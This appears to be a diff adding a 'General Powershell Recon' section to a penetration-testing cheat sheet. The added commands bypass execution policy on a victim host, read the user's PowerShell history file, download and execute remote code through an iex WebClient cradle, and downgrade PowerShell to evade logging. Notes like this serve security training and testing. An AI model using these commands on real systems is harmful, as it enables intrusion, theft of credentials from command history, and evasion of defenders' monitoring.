@@ -15,3 +15,22 @@ Get-ADGroup -Filter * | select name # List AD groups
 Get-ADGroup -Identity <groupname> # Get detailed group info
 Get-ADGroupMember -Identity <groupname> # Get group members
 ```
+
+## General Powershell Recon:
+```PowerShell
+Get-ExecutionPolicy -List # Will print the execution policy
+
+Set-ExecutionPolicy Bypass -Scope Process # This changes the execution policy just for the current session, not making and permanant changes to the victim host
+
+Get-ChildItem Env: | ft Key,Value # Kind of like `set`
+
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt # Get the users PowerShell history
+
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" # Download a file!
+
+```
+
+### Are you able to lower the Powershell version (To evade logging?)
+```PowerShell
+powershell.exe -version 2
+```
